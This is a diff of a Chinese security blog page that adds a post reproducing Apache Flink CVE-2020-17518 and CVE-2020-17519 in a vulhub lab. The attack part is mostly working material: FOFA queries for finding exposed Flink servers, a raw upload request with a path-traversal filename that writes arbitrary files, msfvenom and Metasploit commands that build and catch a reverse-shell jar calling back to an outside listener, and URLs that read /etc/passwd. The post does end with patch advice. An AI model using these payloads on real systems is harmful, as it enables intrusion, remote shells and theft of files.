@@ -20,30 +20,48 @@
     var CONFIG = {"hostname":"dmkxy.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="这是一个用来学安全的博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="DMKXY&#39;s Blog">
-<meta property="og:url" content="https://dmkxy.github.io/index.html">
+  <meta name="description" content="FOFAapp&#x3D;&quot;Apache-Flink&quot; app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Flink CVE-2020-17519&#x2F;17518 漏洞复现">
+<meta property="og:url" content="https://dmkxy.github.io/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="DMKXY&#39;s Blog">
-<meta property="og:description" content="这是一个用来学安全的博客">
+<meta property="og:description" content="FOFAapp&#x3D;&quot;Apache-Flink&quot; app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;">
 <meta property="og:locale">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="article:published_time" content="2021-01-27T16:30:26.000Z">
+<meta property="article:modified_time" content="2021-01-29T16:46:23.328Z">
 <meta property="article:author" content="DMKXY">
+<meta property="article:tag" content="2021.1">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dmkxy.github.io/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
 
-<link rel="canonical" href="https://dmkxy.github.io/">
+<link rel="canonical" href="https://dmkxy.github.io/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>DMKXY's Blog</title>
+  <title>Apache Flink CVE-2020-17519/17518 漏洞复现 | DMKXY's Blog</title>
   
 
 
@@ -192,9 +210,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
@@ -210,10 +229,9 @@
       <meta itemprop="name" content="DMKXY's Blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Apache Flink CVE-2020-17519/17518 漏洞复现</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Apache Flink CVE-2020-17519/17518 漏洞复现
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -256,17 +274,54 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
+        <h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Apache-Flink&quot;
 app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/28/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。在Apache Flink 1.5.1版本中引入了REST API，但其实现上存在多处缺陷，导致任意文件读取（CVE-2020-17519）和任意文件写入（CVE-2020-17518）漏洞<br>CVE-2020-17518攻击者利用REST API，可以修改HTTP头，将上传的文件写入到本地文件系统上的任意位置（Flink 1.5.1进程能访问到的）<br>CVE-2020-17519Apache Flink 1.11.0 允许攻击者通过JobManager进程的REST API读取JobManager本地文件系统上的任何文件（JobManager进程能访问到的）</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>CVE-2020-17518<br>Apache:Apache Flink: 1.5.1 - 1.11.2</p>
+<p>CVE-2020-17519<br>Apache:Apache Flink: 1.11.0, 1.11.1, 1.11.2</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞环境使用vulhub的docker环境搭建，vulhub下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/">https://github.com/vulhub/vulhub/</a><br>下载完成后传入装有docker和docker-compose环境的虚拟机，进入目录</p>
+<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master&#x2F;flink&#x2F;CVE-2020-17518&#x2F;
+docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>拉取漏洞环境,出现”done”表示拉取成功<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>在浏览器输入<a href="http://your-ip:8081查看页面">http://your-ip:8081查看页面</a><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h4><p>访问<a href="http://your-ip:8081，找到Submit">http://your-ip:8081，找到Submit</a> New Job的Add New上传一个jar包，jar包可以在桌面新建一个压缩文件，将zip后缀修改为jar即可，然后抓包<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>将请求包发送到repeater模块进行修改因为我们不知到当前的路径是什么，所以可以使用../切换到根目录因为我们不知到当前的路径是什么，所以可以使用../切换到根目录<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><strong>POC:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1
+Host: IP:8081
+User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0
+Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*
+Accept-Language: en-US,en;q&#x3D;0.5
+Accept-Encoding: gzip, deflate
+Referer: http:&#x2F;&#x2F;IP:8081
+Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------209638986713202799301320123018
+Content-Length: 260
+Connection: close
+-----------------------------209638986713202799301320123018
+Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;111&quot;
+Content-Type: application&#x2F;octet-stream
+
+111
+
+-----------------------------209638986713202799301320123018--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在容器中查看文件是否上传成功</p>
+<pre class="line-numbers language-none"><code class="language-none">docker ps
+docker exec -it [CONTAINER ID] &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>Flink 本身是没有鉴权的，并且它本身支持任意jar包上传并执行，所以可以通过上传jar包getshell<br>msf生成jar格式的马,lhost为kali的ip，lport为kali接收shell的端口</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;shell_reverse_tcp lhost&#x3D;**.***.***.**  lport&#x3D;1234 -f jar &gt;&#x2F;home&#x2F;a.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br>启动msf接收shell</p>
+<pre class="line-numbers language-none"><code class="language-none">msfconsole
+use exploit&#x2F;multi&#x2F;handler
+set payload java&#x2F;shell_reverse_tcp
+set LHOST **.***.***.**
+set LPORT 1234
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br>到此为止关于公网vps监听就已经设置好了，等待上传shell jar文件的连接就好了<br>在Apache Flink中选择Add New，选择木马jar文件上传,点击刚刚上传的木马文件,选择submit<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"><br>这时候在返回公网vps发现已经接收到了反弹的shell,不过这个shell权限不大<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"></p>
+<h4 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h4><p>上面写入后要是不能进入docker查看这里可以利用CVE-2020-17519漏洞进行文件读取，在页面首页输入以下payload查看tmp目录下的文件<br><strong>URL:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252f111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>%252f为/的两次url编码<br><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>修改后面的payload改为查看etc下的passwd文件<br><strong>POC:</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP:PORT&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheFlinkCVE2020-1751917518%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方已发布安全版本，请及时下载升级至安全版本<br><a target="_blank" rel="noopener" href="https://flink.apache.org/zh/downloads.html">https://flink.apache.org/zh/downloads.html</a></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://www.lele8.me/2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/112792615">https://blog.csdn.net/qq_38154820/article/details/112792615</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/khz521/p/14023011.html">https://www.cnblogs.com/khz521/p/14023011.html</a></p>
+
     </div>
 
     
@@ -274,359 +329,36 @@ app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span 
     
 <div>
   
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
+
+  
+</div>
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/2021-1/" rel="tag"><i class="fa fa-tag"></i> 2021.1</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="DMKXY">
-      <meta itemprop="description" content="这是一个用来学安全的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="DMKXY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/" class="post-title-link" itemprop="url">1039家校通SQL注入和后台GETSHELL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-01-25 00:13:06" itemprop="dateCreated datePublished" datetime="2021-01-25T00:13:06+08:00">2021-01-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-27 20:58:31" itemprop="dateModified" datetime="2021-01-27T20:58:31+08:00">2021-01-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-<div>
-  
-</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="DMKXY">
-      <meta itemprop="description" content="这是一个用来学安全的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="DMKXY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">致远OA-ajax.do任意文件上传漏洞复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-01-22 00:30:26" itemprop="dateCreated datePublished" datetime="2021-01-22T00:30:26+08:00">2021-01-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-29 21:49:21" itemprop="dateModified" datetime="2021-01-29T21:49:21+08:00">2021-01-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/" rel="prev" title="1039家校通SQL注入和后台GETSHELL">
+      <i class="fa fa-chevron-left"></i> 1039家校通SQL注入和后台GETSHELL
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-<div>
-  
-</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="DMKXY">
-      <meta itemprop="description" content="这是一个用来学安全的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="DMKXY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">永恒之蓝 MS17-010漏洞复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-01-22 00:13:06 / 修改时间：01:32:40" itemprop="dateCreated datePublished" datetime="2021-01-22T00:13:06+08:00">2021-01-22</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/22/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%20MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-<div>
-  
-</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://dmkxy.github.io/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="DMKXY">
-      <meta itemprop="description" content="这是一个用来学安全的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="DMKXY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">dedecms网站搭建</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-01-21 00:00:00 / 修改时间：16:02:45" itemprop="dateCreated datePublished" datetime="2021-01-21T00:00:00+08:00">2021-01-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">环境搭建</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ol>
-<li>下载织梦开源程序</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-<div>
-  
-</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -679,6 +411,7 @@ app&#x3D;&quot;Apache‐Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span 
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
